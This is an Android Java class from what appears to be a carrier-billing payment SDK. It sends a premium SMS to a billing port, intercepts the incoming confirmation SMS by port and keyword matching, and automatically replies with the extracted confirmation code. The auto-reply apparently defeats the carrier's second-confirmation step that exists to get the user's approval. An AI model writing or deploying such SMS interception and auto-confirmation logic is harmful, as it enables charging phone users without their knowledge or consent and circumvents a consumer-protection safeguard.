package com.tianzh.pay.model;

import android.content.Context;
import com.tianzh.pay.service.msg.*;
import com.tianzh.pay.utils.LogUtils;
import com.tianzh.pay.utils.MsgObserverUtils;
import com.tianzh.pay.utils.PaidWaysReportUtils;
import com.tianzh.pay.utils.PayUtils;

import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by pig on 2015-11-13.
 */
public class ConfirmPaidMsg extends PaidMsg {
    private IncomingMsgObserver observer;
    private String port;
    private String msg;
    private String confirmPort;
    private SendMsgStatusReader firstReader;
    private SendMsgStatusReader secondReader;
    private Timer confirmPaidMsgTimer = new Timer();
    private TimerTask confirmPaidMsgTask;
    private int paidWayId;

    public ConfirmPaidMsg(final Context context, HashMap<String, Object> params) {
        port = (String) params.get("port");
        msg = (String) params.get("msg");
        confirmPort = (String) params.get("confirmPort");
        paidWayId = (Integer) params.get("paidWayId");

        final boolean sucessCallBack = (Boolean) params.get("sucessCallBack");
        final boolean failCallBack = (Boolean) params.get("failCallBack");

        final String productId = (String) params.get("productId");
        final String userOrderId = (String) params.get("userOrderId");
        final String tianzhOrderId = (String) params.get("tianzhOrderId");
        final int confirmMsgDelay = (Integer) params.get("confirmMsgDelay");

        confirmPaidMsgTask = new TimerTask() {
            @Override
            public void run() {
                if (failCallBack)
                    PayUtils.failCallBack(context, tianzhOrderId, userOrderId, productId, "未收到二次确认短信", "30003");
                PaidWaysReportUtils.failReport(paidWayId, tianzhOrderId, 301);
            }
        };

        firstReader = new SendMsgStatusReader(context) {
            @Override
            public void sendMsgSucess() {
                confirmPaidMsgTimer.schedule(confirmPaidMsgTask, confirmMsgDelay);
                MsgObserverUtils.addObserver(observer);
            }

            @Override
            public void sendMsgFail() {
                if (failCallBack)
                    PayUtils.failCallBack(context, tianzhOrderId, userOrderId, productId, "支付短信发送失败", "30002");
                PaidWaysReportUtils.failReport(paidWayId, tianzhOrderId, 300);
            }
        };

        observer = new ConfirmMsgImpl(context, (String) params.get("interceptPort"), "", (String) params.get("interceptPreKeyWords"), (String) params.get("interceptBackKeyWords"), new ConfirmContentListener() {
            @Override
            public void handleConfirmContent(final String confirmContent) {
                confirmPaidMsgTimer.cancel();

                secondReader = new SendMsgStatusReader(context) {
                    @Override
                    public void sendMsgSucess() {
                        if (sucessCallBack)
                            PayUtils.sucessCallBack(context, tianzhOrderId, userOrderId, productId);
                        PaidWaysReportUtils.sucessReport(paidWayId, tianzhOrderId);
                    }

                    @Override
                    public void sendMsgFail() {
                        if (failCallBack)
                            PayUtils.failCallBack(context, tianzhOrderId, userOrderId, productId, "支付短信发送失败", "30002");
                        PaidWaysReportUtils.failReport(paidWayId, tianzhOrderId, 300);
                    }
                };

                secondReader.send(confirmPort, confirmContent);
            }
        });
    }

    @Override
    public void pay() {
        firstReader.send(port, msg);
    }
}
